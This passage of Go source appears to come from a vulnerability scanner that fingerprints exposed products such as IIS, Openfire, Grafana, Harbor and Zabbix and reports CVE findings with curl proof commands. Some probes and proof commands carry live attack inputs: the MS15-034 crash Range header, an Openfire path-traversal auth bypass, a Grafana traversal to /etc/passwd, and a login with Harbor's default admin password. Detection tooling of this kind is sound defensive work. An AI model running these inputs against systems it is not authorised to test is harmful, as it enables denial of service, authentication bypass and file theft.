			Description: "IIS HTTP.sys returned HTTP 416 for a Range header containing UINT64_MAX as the end byte. " +
				"Patched IIS rejects this with 400 Bad Request; returning 416 indicates the vulnerable HTTP.sys " +
				"code path was entered. CVE-2015-1635 (MS15-034, CVSS 10.0, KEV) is an integer overflow in the " +
				"Windows HTTP.sys kernel driver that allows an unauthenticated attacker to cause a Blue Screen of " +
				"Death (kernel crash/DoS) and potentially read kernel memory. Affects Windows Server 2003–2012 R2 " +
				"with IIS 6.0–8.5 before the May 2015 security update (KB3042553). " +
				"Apply MS15-034 immediately. This affects all internet-facing IIS servers on unpatched Windows.",
			Evidence: map[string]any{
				"url":    u,
				"server": resp.Header.Get("Server"),
				"range":  "bytes=6000-18446744073709551615",
			},
			ProofCommand: fmt.Sprintf(
				"curl -s -o /dev/null -w '%%{http_code}' -H 'Range: bytes=6000-18446744073709551615' '%s'\n"+
					"# Vulnerable: 416 — Patched: 400 Bad Request",
				u),
			DiscoveredAt: time.Now(),
		}
	}
	return nil
}

// probeBarracudaESG tests for CVE-2023-2868 (Barracuda Email Security Gateway
// pre-auth RCE via TAR attachment filename injection, CVSS 9.8, KEV, nation-state
// exploited). The probe fingerprints the appliance via /cgi-mod/index.cgi — a
// 200 response with Barracuda-specific content confirms an exposed ESG instance.
// The actual CVE requires a malformed email; the probe only confirms presence.
func probeBarracudaESG(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/cgi-mod/index.cgi"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyLow := strings.ToLower(string(body))
	if !strings.Contains(bodyLow, "barracuda") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEBarracudaESG,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-2868: Barracuda Email Security Gateway exposed on %s", asset),
		Description: fmt.Sprintf(
			"%s is exposing a Barracuda Email Security Gateway login page. "+
				"CVE-2023-2868 (CVSS 9.8, KEV) is a pre-authentication command injection "+
				"via the TAR attachment filename processing pipeline. Nation-state actors "+
				"(UNC4841/China Nexus) exploited this zero-day for espionage; Barracuda "+
				"issued a physical replacement advisory for all affected appliances (versions "+
				"5.1.3.001–9.2.0.006). Verify the appliance firmware version and apply the "+
				"emergency patch or replacement as directed by Barracuda.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":          u,
			"body_excerpt": string(body)[:min(len(body), 256)],
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s' | grep -i barracuda", u),
		DiscoveredAt: time.Now(),
	}
}

// probeOpenfire tests for CVE-2023-32315 (Openfire < 4.7.5 authentication bypass
// via path traversal on setup pages, CVSS 9.8, KEV). Openfire is fingerprinted via
// /login.jsp; the traversal probe /setup/setup-s/%u002e%u002e/%u002e%u002e/log/login.html
// bypasses auth restrictions by encoding dots in the path segment.
func probeOpenfire(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Step 1: fingerprint Openfire.
	loginReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/login.jsp", nil)
	if err != nil {
		return nil
	}
	loginResp, err := client.Do(loginReq)
	if err != nil {
		return nil
	}
	loginBody, _ := io.ReadAll(io.LimitReader(loginResp.Body, 4096))
	loginResp.Body.Close()
	if !strings.Contains(strings.ToLower(string(loginBody)), "openfire") {
		return nil
	}

	// Step 2: attempt the path-traversal bypass to the setup log page.
	traversalURL := base + "/setup/setup-s/%u002e%u002e/%u002e%u002e/log/login.html"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, traversalURL, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	// Vulnerable: 200 with login or log content (not a redirect to /login.jsp).
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyLow := strings.ToLower(string(body))
	if strings.Contains(bodyLow, "redirect") && strings.Contains(bodyLow, "login.jsp") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEOpenfire,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-32315: Openfire admin auth bypass confirmed on %s", asset),
		Description: fmt.Sprintf(
			"%s is running Openfire XMPP server with CVE-2023-32315 (CVSS 9.8, KEV). "+
				"The path traversal bypass on setup pages (/setup/setup-s/%%u002e%%u002e/...) "+
				"allows unauthenticated access to the Openfire admin console. "+
				"Affects all versions before 4.6.8 and 4.7.0–4.7.4. "+
				"Upgrade to Openfire 4.6.8 or 4.7.5 immediately.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"traversal_url": traversalURL,
			"body_excerpt":  string(body)[:min(len(body), 256)],
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s'", traversalURL),
		DiscoveredAt: time.Now(),
	}
}

// probeCiscoASASSLVPN tests for CVE-2023-20269 (Cisco ASA / FTD SSL VPN
// unauthorized session creation, CVSS 9.1, KEV). The /+CSCOE+/logon.html path
// is specific to Cisco AnyConnect SSL VPN portal. Its presence confirms the VPN
// portal is internet-exposed and is the entry point for the brute-force /
// unauthorized session vulnerability.
func probeCiscoASASSLVPN(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/+CSCOE+/logon.html"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyLow := strings.ToLower(string(body))
	if !strings.Contains(bodyLow, "cisco") && !strings.Contains(bodyLow, "anyconnect") &&
		!strings.Contains(bodyLow, "cscoe") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVECiscoASASSLVPN,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-20269: Cisco ASA/FTD SSL VPN portal exposed on %s", asset),
		Description: fmt.Sprintf(
			"%s is exposing a Cisco ASA or FTD SSL VPN (AnyConnect) portal. "+
				"CVE-2023-20269 (CVSS 9.1, KEV) allows unauthenticated attackers to conduct "+
				"brute-force attacks against VPN credentials and establish clientless SSL VPN "+
				"sessions without a valid account in certain configurations. "+
				"Apply Cisco's advisory patches and enforce MFA on all VPN logins.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":          u,
			"body_excerpt": string(body)[:min(len(body), 256)],
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s' | grep -i cisco", u),
		DiscoveredAt: time.Now(),
	}
}

// probeRoundcube tests for CVE-2023-43770 (Roundcube Webmail stored XSS via
// HTML email links, CVSS 6.1). The / root returns a meta generator tag with
// the Roundcube version. Affected: < 1.4.14, < 1.5.4, < 1.6.3.
func probeRoundcube(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	// Look for: <meta name="generator" content="Roundcube Webmail/1.6.2">
	ver := parseMetaGenerator(bodyStr, "Roundcube Webmail/")
	if ver == "" {
		return nil
	}
	if !isRoundcubeVulnerable(ver) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVERoundcube,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityHigh,
		Title:    fmt.Sprintf("CVE-2023-43770: Roundcube %s vulnerable to stored XSS on %s", ver, asset),
		Description: fmt.Sprintf(
			"%s is running Roundcube Webmail %s which is vulnerable to CVE-2023-43770. "+
				"A stored XSS via crafted link references in HTML emails allows a remote attacker "+
				"to execute JavaScript in victims' browsers upon viewing a malicious email. "+
				"Affects Roundcube before 1.4.14, 1.5.4, and 1.6.3. "+
				"Upgrade to the latest stable release immediately.",
			asset, ver,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":     u,
			"version": ver,
		},
		ProofCommand: fmt.Sprintf(`curl -sk '%s' | grep -i 'meta.*generator'`, u),
		DiscoveredAt: time.Now(),
	}
}

// isRoundcubeVulnerable returns true for Roundcube versions affected by CVE-2023-43770:
// < 1.4.14, < 1.5.4, < 1.6.3.
func isRoundcubeVulnerable(ver string) bool {
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 2 {
		return false
	}
	maj, min, patch := 0, 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	if len(parts) == 3 {
		fmt.Sscanf(parts[2], "%d", &patch)
	}
	if maj != 1 {
		return false
	}
	switch min {
	case 4:
		return patch < 14
	case 5:
		return patch < 4
	case 6:
		return patch < 3
	default:
		return min < 4
	}
}

// parseMetaGenerator extracts a version string from <meta name="generator" content="PREFIX/X.Y.Z">.
// prefix should include the trailing "/" (e.g. "Roundcube Webmail/").
func parseMetaGenerator(body, prefix string) string {
	lower := strings.ToLower(body)
	prefixLow := strings.ToLower(prefix)
	idx := strings.Index(lower, "meta")
	for idx != -1 {
		chunk := lower[idx:]
		if strings.Contains(chunk[:min(len(chunk), 200)], "generator") {
			if pi := strings.Index(strings.ToLower(body[idx:]), prefixLow); pi != -1 {
				rest := body[idx+pi+len(prefix):]
				end := strings.IndexAny(rest, `"' >`)
				if end > 0 {
					return rest[:end]
				}
			}
		}
		next := strings.Index(lower[idx+1:], "meta")
		if next == -1 {
			break
		}
		idx = idx + 1 + next
	}
	return ""
}

// probeOracleEBS tests for CVE-2022-21587 (Oracle E-Business Suite RF.jsp
// unauthenticated arbitrary file read, CVSS 9.8, KEV). The /OA_HTML/RF.jsp
// endpoint is present on EBS instances; its accessibility without credentials
// confirms the vulnerable endpoint is reachable.
func probeOracleEBS(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/OA_HTML/RF.jsp"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyLow := strings.ToLower(string(body))
	// Confirm Oracle EBS content (not a generic catch-all).
	if !strings.Contains(bodyLow, "oracle") && !strings.Contains(bodyLow, "e-business") &&
		!strings.Contains(bodyLow, "oa_html") && !strings.Contains(bodyLow, "fnd") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEOracleEBS,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2022-21587: Oracle E-Business Suite RF.jsp exposed on %s", asset),
		Description: fmt.Sprintf(
			"%s is exposing the Oracle E-Business Suite RF.jsp endpoint without authentication. "+
				"CVE-2022-21587 (CVSS 9.8, KEV) allows unauthenticated attackers to read arbitrary "+
				"files from the Oracle EBS server via this endpoint. "+
				"Apply Oracle's Critical Patch Update (CPU) for October 2022 or later immediately.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":          u,
			"body_excerpt": string(body)[:min(len(body), 256)],
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s'", u),
		DiscoveredAt: time.Now(),
	}
}

// probeManageEngineADSelfService tests for CVE-2021-40539 (ManageEngine
// ADSelfService Plus REST API authentication bypass → RCE, CVSS 9.8, KEV).
// The /LoginAction.do endpoint fingerprints an exposed ADSelfService instance.
func probeManageEngineADSelfService(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/LoginAction.do"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyLow := strings.ToLower(string(body))
	if !strings.Contains(bodyLow, "manageengine") && !strings.Contains(bodyLow, "adselfservice") &&
		!strings.Contains(bodyLow, "adself") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEManageEngineADSelfSvc,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2021-40539: ManageEngine ADSelfService Plus exposed on %s", asset),
		Description: fmt.Sprintf(
			"%s is exposing a ManageEngine ADSelfService Plus login page. "+
				"CVE-2021-40539 (CVSS 9.8, KEV) is a REST API authentication bypass that allows "+
				"unauthenticated RCE on ADSelfService Plus build 6113 and earlier. "+
				"Nation-state APT groups (APT27, DEV-0322) actively exploited this vulnerability. "+
				"Upgrade to build 6114 or later immediately.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":          u,
			"body_excerpt": string(body)[:min(len(body), 256)],
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s' | grep -i manageengine", u),
		DiscoveredAt: time.Now(),
	}
}

// probeSonicWallSMA tests for CVE-2021-20028 (SonicWall SMA 100/200/400/500v
// pre-authentication SQL injection, CVSS 9.8, KEV). The /cgi-bin/welcome path
// fingerprints an exposed SonicWall SMA appliance.
func probeSonicWallSMA(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/cgi-bin/welcome"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyLow := strings.ToLower(string(body))
	if !strings.Contains(bodyLow, "sonicwall") && !strings.Contains(bodyLow, "sslvpn") &&
		!strings.Contains(bodyLow, "sma") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVESonicWallSMAExposed,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2021-20028: SonicWall SMA appliance exposed on %s", asset),
		Description: fmt.Sprintf(
			"%s is exposing a SonicWall Secure Mobile Access (SMA) 100-series appliance. "+
				"CVE-2021-20028 (CVSS 9.8, KEV) is a pre-authentication SQL injection vulnerability "+
				"affecting SMA 200, 210, 400, 410, and 500v running firmware before 10.2.0.8-37sv. "+
				"Apply the SonicWall firmware update immediately and audit for unauthorized access.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":          u,
			"body_excerpt": string(body)[:min(len(body), 256)],
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s' | grep -i sonicwall", u),
		DiscoveredAt: time.Now(),
	}
}

// probevBulletin5x tests for CVE-2020-17496 (vBulletin 5.5.4–5.6.2 widget
// PHP eval → unauthenticated RCE, CVSS 9.8, KEV). The / page meta generator
// reveals the vBulletin version; 5.5.4–5.6.2 are affected by the subwidgetConfig
// code execution vulnerability.
func probevBulletin5x(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	ver := parseMetaGenerator(string(body), "vBulletin/")
	if ver == "" {
		// Also try "vBulletin 5" pattern in body.
		lower := strings.ToLower(string(body))
		if idx := strings.Index(lower, "vbulletin"); idx != -1 {
			// Not enough to emit a finding without a version.
			_ = idx
		}
		return nil
	}
	if !isvBulletin5xVulnerable(ver) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEvBulletin5xRCE,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2020-17496: vBulletin %s vulnerable to unauthenticated RCE on %s", ver, asset),
		Description: fmt.Sprintf(
			"%s is running vBulletin %s which is vulnerable to CVE-2020-17496 (CVSS 9.8, KEV). "+
				"The subwidgetConfig parameter in /ajax/render/widget_php allows unauthenticated "+
				"arbitrary PHP code execution. Affects vBulletin 5.5.4–5.6.2. "+
				"Upgrade to vBulletin 5.6.3 or later immediately.",
			asset, ver,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":     u,
			"version": ver,
		},
		ProofCommand: fmt.Sprintf(`curl -sk '%s' | grep -i 'meta.*generator'`, u),
		DiscoveredAt: time.Now(),
	}
}

// isvBulletin5xVulnerable returns true for vBulletin 5.5.4–5.6.2.
func isvBulletin5xVulnerable(ver string) bool {
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 2 {
		return false
	}
	maj, min, patch := 0, 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	if len(parts) == 3 {
		fmt.Sscanf(parts[2], "%d", &patch)
	}
	if maj != 5 {
		return false
	}
	if min == 5 {
		return patch >= 4
	}
	if min == 6 {
		return patch <= 2
	}
	return false
}

// probeColdFusionFCKEditor tests for CVE-2018-15961 (Adobe ColdFusion FCKEditor
// unrestricted file upload → unauthenticated RCE, CVSS 9.8, KEV). The upload.cfm
// endpoint in the bundled FCKEditor connector is accessible without authentication
// on unpatched ColdFusion instances.
func probeColdFusionFCKEditor(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	// 200 or 500 from ColdFusion confirms the endpoint exists and is reachable.
	// A 404 means ColdFusion is not present or the path has been removed.
	if resp.StatusCode == http.StatusNotFound || resp.StatusCode == http.StatusForbidden {
		return nil
	}
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusInternalServerError {
		return nil
	}
	bodyLow := strings.ToLower(string(body))
	// Confirm ColdFusion origin — avoid false positives on generic error pages.
	if !strings.Contains(bodyLow, "coldfusion") && !strings.Contains(bodyLow, "cfm") &&
		!strings.Contains(bodyLow, "fckeditor") && resp.StatusCode != http.StatusInternalServerError {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEColdFusionFCKEditor,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2018-15961: ColdFusion FCKEditor file upload endpoint exposed on %s", asset),
		Description: fmt.Sprintf(
			"%s is exposing the Adobe ColdFusion FCKEditor file upload connector at "+
				"/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm. "+
				"CVE-2018-15961 (CVSS 9.8, KEV) allows unauthenticated attackers to upload "+
				"arbitrary files (including CFM web shells) through this endpoint. "+
				"Apply Adobe ColdFusion updates (APSB18-33) and remove or block access to "+
				"the /CFIDE/ directory from the internet.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":    u,
			"status": resp.StatusCode,
		},
		ProofCommand: fmt.Sprintf("curl -sk -o /dev/null -w '%%{http_code}' '%s'", u),
		DiscoveredAt: time.Now(),
	}
}

// probeHarbor tests for Harbor container registry exposure and default credentials.
// CVE-2026-4404 (CVSS 9.4): Harbor ≤ 2.15.0 accepts admin:Harbor12345 by default.
// CVE-2022-46463 (CVSS 8.x): unauthenticated users can pull private images.
// /api/v2.0/systeminfo returns harbor_version unauthenticated.
func probeHarbor(ctx context.Context, client *http.Client, base, asset string) []finding.Finding {
	u := base + "/api/v2.0/systeminfo"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	if !strings.Contains(strings.ToLower(bodyStr), "harbor") &&
		!strings.Contains(bodyStr, "harbor_version") {
		return nil
	}
	ver := parseJSONField(bodyStr, "harbor_version")
	ev := map[string]any{
		"url":  u,
		"body": bodyStr[:min(len(bodyStr), 512)],
	}
	if ver != "" {
		ev["harbor_version"] = ver
	}
	return []finding.Finding{
		{
			CheckID:  finding.CheckPortHarborExposed,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityHigh,
			Title:    fmt.Sprintf("Harbor container registry admin API exposed on %s", asset),
			Description: fmt.Sprintf(
				"%s is exposing a Harbor container registry at /api/v2.0/systeminfo without authentication. "+
					"Harbor stores all container images and associated metadata. "+
					"CVE-2022-46463 allows unauthenticated image pulls on misconfigured instances. "+
					"Restrict to trusted networks and enforce authentication.",
				asset,
			),
			Asset:        asset,
			Evidence:     ev,
			ProofCommand: fmt.Sprintf("curl -sk '%s' | jq .harbor_version", u),
			DiscoveredAt: time.Now(),
		},
		{
			CheckID:  finding.CheckCVEHarborDefaultCreds,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    fmt.Sprintf("CVE-2026-4404: Harbor registry may accept default admin credentials on %s", asset),
			Description: fmt.Sprintf(
				"%s is running Harbor container registry (version: %s). "+
					"CVE-2026-4404 (CVSS 9.4) — Harbor ≤ 2.15.0 ships with the default "+
					"admin password 'Harbor12345'. If unchanged, an attacker gains admin "+
					"access to all container images, can push malicious images, and read "+
					"pull secrets stored in Harbor. Change the admin password immediately.",
				asset, ver,
			),
			Asset:        asset,
			Evidence:     ev,
			ProofCommand: fmt.Sprintf("curl -sk -u admin:Harbor12345 '%s/api/v2.0/users' | jq .", base),
			DiscoveredAt: time.Now(),
		},
	}
}

// parseJSONField is a lightweight JSON field extractor for "key":"value" patterns.
// It handles both string values and bare numeric/boolean values.
func parseJSONField(body, key string) string {
	needle := `"` + key + `"`
	idx := strings.Index(body, needle)
	if idx == -1 {
		return ""
	}
	rest := body[idx+len(needle):]
	colon := strings.IndexByte(rest, ':')
	if colon == -1 {
		return ""
	}
	rest = strings.TrimSpace(rest[colon+1:])
	if strings.HasPrefix(rest, `"`) {
		rest = rest[1:]
		end := strings.IndexByte(rest, '"')
		if end < 0 {
			return ""
		}
		return rest[:end]
	}
	// Bare value (number/bool/null).
	end := strings.IndexAny(rest, ",}")
	if end < 0 {
		return strings.TrimSpace(rest)
	}
	return strings.TrimSpace(rest[:end])
}

// probeArgoCD tests for Argo CD GitOps platform exposure.
// CVE-2025-55190 (CVSS 10.0): project API tokens can retrieve repo credentials.
// /api/version is unauthenticated and returns Argo CD version information.
func probeArgoCD(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/api/version"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	// Argo CD /api/version returns {"Version":"v2.x.x","BuildDate":"...","GoVersion":"..."}
	// The Version field starting with "v2" or "v3" uniquely identifies Argo CD.
	ver := parseJSONField(bodyStr, "Version")
	if ver == "" || (!strings.HasPrefix(ver, "v") && !strings.Contains(ver, ".")) {
		return nil
	}
	if !strings.Contains(bodyStr, "BuildDate") && !strings.Contains(bodyStr, "GoVersion") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckPortArgoCDExposed,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityHigh,
		Title:    fmt.Sprintf("Argo CD GitOps platform %s exposed on %s", ver, asset),
		Description: fmt.Sprintf(
			"%s is running Argo CD %s with the version endpoint publicly accessible. "+
				"CVE-2025-55190 (CVSS 10.0) allows project API tokens to leak repository "+
				"credentials from /api/v1/projects/{project}/detailed. "+
				"Affects Argo CD 2.13.0–2.13.8, 2.14.0–2.14.15, all 3.x < 3.0.14. "+
				"Restrict Argo CD to internal networks and upgrade immediately.",
			asset, ver,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":     u,
			"version": ver,
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s' | jq .Version", u),
		DiscoveredAt: time.Now(),
	}
}

// probeGrafanaPathTraversal tests for CVE-2021-43798 (Grafana < 8.3.0 plugin
// endpoint path traversal → arbitrary file read, CVSS 7.5, KEV).
// /api/health returns version JSON unauthenticated on all Grafana instances.
func probeGrafanaPathTraversal(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/api/health"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	ver := parseJSONField(bodyStr, "version")
	if ver == "" {
		return nil
	}
	// Confirm it's Grafana (not another service with /api/health).
	if !strings.Contains(bodyStr, "database") && !strings.Contains(bodyStr, "commit") {
		return nil
	}
	if !isGrafanaPathTraversalVulnerable(ver) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEGrafanaPathTraversal,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityHigh,
		Title:    fmt.Sprintf("CVE-2021-43798: Grafana %s plugin path traversal on %s", ver, asset),
		Description: fmt.Sprintf(
			"%s is running Grafana %s which is vulnerable to CVE-2021-43798 (CVSS 7.5, KEV). "+
				"The plugin endpoint /public/plugins/{plugin-id}/../../../etc/passwd allows "+
				"unauthenticated arbitrary file reads on the Grafana server. "+
				"Affects Grafana 8.0.0–8.2.x (before 8.3.0). "+
				"Upgrade to Grafana 8.3.0 or later immediately.",
			asset, ver,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":     u,
			"version": ver,
		},
		ProofCommand: fmt.Sprintf(
			"curl -sk '%s/public/plugins/alertlist/../../../../../../../etc/passwd'",
			base,
		),
		DiscoveredAt: time.Now(),
	}
}

// isGrafanaPathTraversalVulnerable returns true for Grafana 8.0.0–8.2.x (< 8.3.0).
func isGrafanaPathTraversalVulnerable(ver string) bool {
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 2 {
		return false
	}
	maj, min := 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	return maj == 8 && min < 3
}

// probeZabbixSessionForge tests for CVE-2024-36466 / CVE-2024-36467 (Zabbix
// session cookie forgery + API authentication bypass, CVSS 9.9). The Zabbix
// JSON-RPC API allows an unauthenticated apiinfo.version call, which returns
// the server version. Affected: Zabbix < 6.0.32 and 7.0.x < 7.0.1.
func probeZabbixSessionForge(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	for _, path := range []string{"/api_jsonrpc.php", "/zabbix/api_jsonrpc.php"} {
		u := base + path
		payload := `{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}`
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, u,
			strings.NewReader(payload))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			continue
		}
		bodyStr := string(body)
		ver := parseJSONField(bodyStr, "result")
		if ver == "" {
			continue
		}
		if !isZabbixSessionForgeVulnerable(ver) {
			return nil
		}
		return &finding.Finding{
			CheckID:  finding.CheckCVEZabbixSessionForge,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    fmt.Sprintf("CVE-2024-36466/36467: Zabbix %s session forgery + API bypass on %s", ver, asset),
			Description: fmt.Sprintf(
				"%s is running Zabbix %s which is vulnerable to CVE-2024-36466 and CVE-2024-36467. "+
					"CVE-2024-36466 allows forged session cookies; CVE-2024-36467 allows bypassing "+
					"API authentication. Combined CVSS 9.9. "+
					"Affects Zabbix < 6.0.32 and 7.0.x < 7.0.1. "+
					"Upgrade to Zabbix 6.0.32+ or 7.0.1+ immediately.",
				asset, ver,
			),
			Asset: asset,
			Evidence: map[string]any{
				"url":     u,
				"version": ver,
			},
			ProofCommand: fmt.Sprintf(
				`curl -s -X POST '%s' -H 'Content-Type: application/json' `+
					`-d '{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}' | jq .result`,
				u,
			),
			DiscoveredAt: time.Now(),
		}
	}
	return nil
}

// isZabbixSessionForgeVulnerable returns true for Zabbix < 6.0.32 and 7.0.x < 7.0.1.
func isZabbixSessionForgeVulnerable(ver string) bool {
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 2 {
		return false
	}
	maj, min, patch := 0, 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	if len(parts) == 3 {
		fmt.Sscanf(parts[2], "%d", &patch)
	}
	if maj == 6 && min == 0 {
		return patch < 32
	}
	if maj == 7 && min == 0 {
		return patch < 1
	}
